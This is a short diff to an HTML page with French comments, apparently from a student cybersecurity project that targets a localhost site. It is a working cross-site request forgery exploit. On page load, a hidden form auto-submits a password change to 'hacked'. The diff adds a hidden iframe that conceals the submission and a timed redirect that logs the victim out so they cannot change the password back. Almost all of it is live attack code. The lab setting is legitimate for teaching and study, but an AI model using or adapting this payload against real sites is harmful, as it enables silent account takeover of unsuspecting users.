@@ -12,13 +12,22 @@
 
     <!-- ATTENTION : Si votre site est dans un sous-dossier (ex: http://localhost/SAE-Cyber/), 
          ajoutez ce dossier dans l'URL ci-dessous. Ici on vise localhost a la racine. -->
-    <form action="http://localhost/index.php?page=profil" method="POST" id="hackForm">
+
+    <!-- Iframe caché pour soumettre le formulaire sans quitter la page -->
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+    <form action="http://localhost/index.php?page=profil" method="POST" id="hackForm" target="hiddenFrame">
         <input type="hidden" name="new_password" value="hacked">
     </form>
 
     <script>
         // Le script valide le formulaire automatiquement sans que l'utilisateur ne clique
         document.getElementById('hackForm').submit();
+
+        // Après 2 secondes, on déconnecte l'utilisateur pour l'empêcher de remodifier son mot de passe
+        setTimeout(function () {
+            window.location.href = "http://localhost/index.php?page=logout";
+        }, 2000);
     </script>
 </body>
 
